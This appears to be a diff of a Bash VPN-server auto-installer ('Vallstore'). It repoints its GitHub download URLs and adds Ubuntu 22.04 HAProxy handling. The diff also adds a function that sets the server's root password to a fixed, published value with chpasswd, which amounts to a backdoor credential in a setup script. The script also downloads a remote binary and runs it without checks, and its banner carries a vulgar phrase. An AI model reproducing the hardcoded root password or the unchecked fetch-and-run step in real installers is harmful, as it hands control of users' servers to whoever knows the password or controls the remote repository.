@@ -27,6 +27,7 @@ clear;clear;clear
 echo -e "${YELLOW}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
 echo -e "  Developer » VALLSTORE࿐${YELLOW}(${NC}${green} Stable Edition ${NC}${YELLOW})${NC}"
 echo -e "  » This Will Quick Setup VPN Server On Your Server"
+echo -e "  » Support Ubuntu 18/20/22 & Debian 9/10/11"
 echo -e "  Pembuat : ${green}Vallstore࿐® ${NC}"
 echo -e "  ©NO COPY SCRIP MEMEK TEMBEM࿐ ${YELLOW}(${NC} 2024 ${YELLOW})${NC}"
 echo -e "${YELLOW}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
@@ -84,7 +85,7 @@ gem install lolcat
 apt install wondershaper -y
 clear
 # REPO    
-    REPO="https://raw.githubusercontent.com/alrel1408/AutoScript/"
+    REPO="https://raw.githubusercontent.com/alrel1408/autoscripvpsnew/"
 
 ####
 start=$(date +%s)
@@ -164,8 +165,15 @@ function first_setup(){
     echo "Setup Dependencies $(cat /etc/os-release | grep -w PRETTY_NAME | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/PRETTY_NAME//g')"
     sudo apt update -y
     apt-get install --no-install-recommends software-properties-common
-    add-apt-repository ppa:vbernat/haproxy-2.0 -y
-    apt-get -y install haproxy=2.0.\*
+    # Support untuk Ubuntu 22.04
+    UBUNTU_VERSION=$(lsb_release -rs)
+    if [[ $UBUNTU_VERSION == "22.04" ]]; then
+        add-apt-repository ppa:vbernat/haproxy-2.4 -y
+        apt-get -y install haproxy=2.4.\*
+    else
+        add-apt-repository ppa:vbernat/haproxy-2.0 -y
+        apt-get -y install haproxy=2.0.\*
+    fi
 elif [[ $(cat /etc/os-release | grep -w ID | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/ID//g') == "debian" ]]; then
     echo "Setup Dependencies For OS Is $(cat /etc/os-release | grep -w PRETTY_NAME | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/PRETTY_NAME//g')"
     curl https://haproxy.debian.net/bernat.debian.org.gpg |
@@ -231,6 +239,13 @@ function base_package() {
 }
 clear
 # Fungsi input domain
+function password_default() {
+echo -e "$green [INFO]$NC Mengganti password default"
+# Ganti password default
+echo 'root:Vallstore@2024' | chpasswd
+sleep 1
+}
+
 function pasang_domain() {
 echo -e ""
 clear
@@ -271,7 +286,7 @@ restart_system(){
 MYIP=$(curl -sS ipv4.icanhazip.com)
 echo -e "\e[32mloading...\e[0m" 
 clear
-izinsc="https://raw.githubusercontent.com/alrel1408/AutoScript/main/Register"
+izinsc="https://raw.githubusercontent.com/alrel1408/autoscripvpsnew/main/Register"
 # USERNAME
 rm -f /usr/bin/user
 username=$(curl $izinsc | grep $MYIP | awk '{print $2}')
@@ -534,7 +549,7 @@ print_success "Password SSH"
 function udp_mini(){
 clear
 print_install "Memasang Service Limit IP & Quota"
-wget -q https://raw.githubusercontent.com/alrel1408/AutoScript/main/config/fv-tunnel && chmod +x fv-tunnel && ./fv-tunnel
+wget -q https://raw.githubusercontent.com/alrel1408/autoscripvpsnew/main/config/fv-tunnel && chmod +x fv-tunnel && ./fv-tunnel
 
 # // Installing UDP Mini
 mkdir -p /usr/local/kyt/
